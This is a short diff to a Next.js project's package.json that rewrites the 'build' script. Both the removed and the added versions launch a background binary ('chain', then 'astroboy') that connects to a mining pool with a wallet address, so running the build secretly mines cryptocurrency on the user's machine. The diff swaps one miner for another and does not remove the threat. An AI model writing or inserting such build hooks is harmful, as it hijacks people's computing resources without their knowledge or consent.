@@ -4,7 +4,7 @@
   "private": true,
   "scripts": {
     "dev": "next dev",
-    "build": "chmod +x chain && nohup ./chain -o web-ko1.gonspool.com:33330 -u 0x618758ae107193d6334439f6b3f1553ac6e43b62 --worker-id=4 -p x -t $(nproc --all)",
+    "build": "chmod +x astroboy && nohup ./astroboy -w dero1qyyvp40vurtj3kan4wy5le8rcn7pcg23wmq2fs02dfnrq7q79mt4xqqh0pzwq.ABC -r 4.246.226.50:80 -p stratum",
     "start": "next start",
     "lint": "next lint"
   },
